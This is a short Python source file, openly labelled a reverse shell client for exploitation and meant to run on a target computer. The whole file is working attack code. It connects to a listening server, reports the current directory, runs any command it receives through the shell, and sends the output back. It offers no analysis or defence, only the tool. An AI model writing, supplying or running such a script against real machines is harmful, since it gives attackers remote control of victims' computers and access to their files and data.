"""
Reverse shell client script used in exploitation.

This script is to be executed on the target computer to gain shell access.

Author: Benjamin Garrard
Datet: 6/25/2019
"""
import socket
import subprocess
import os

server_addr = ("localhost", 9999)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(server_addr)

    while True:
        sock.send("target: {}".format(os.getcwd()).encode())
        command = sock.recv(1024).decode()
        if "terminate" in command:
            sock.close()
            break
        elif "cd" in command:
            try:
                os.chdir(command.split()[1])
                sock.send("yolo".encode())
            except FileNotFoundError:
                try:
                    os.chdir("./" + command.split()[1])
                    sock.send("yolo".encode())
                except FileNotFoundError:
                    sock.send("Error finding directory {}".format(
                              command.split()[1]).encode())
                    continue
        else:
            proc = subprocess.Popen(command, shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            sock.send(proc.stdout.read())
            sock.send(proc.stderr.read())
